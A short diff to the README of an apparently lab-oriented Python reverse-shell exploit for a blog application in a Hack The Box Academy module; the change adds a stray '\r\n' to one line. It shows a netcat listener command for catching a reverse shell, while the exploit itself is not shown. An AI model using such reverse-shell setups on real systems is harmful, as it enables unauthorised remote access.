@@ -2,7 +2,7 @@
 python based revshell exploit for facebook style blog for HTB academy shell module.
 
 # Usage: 
-start listner in one terminal window : 
+start listner in one terminal window : \r\n
 nc -lnvp 4444
 
 on another terminal window, execute below command : 
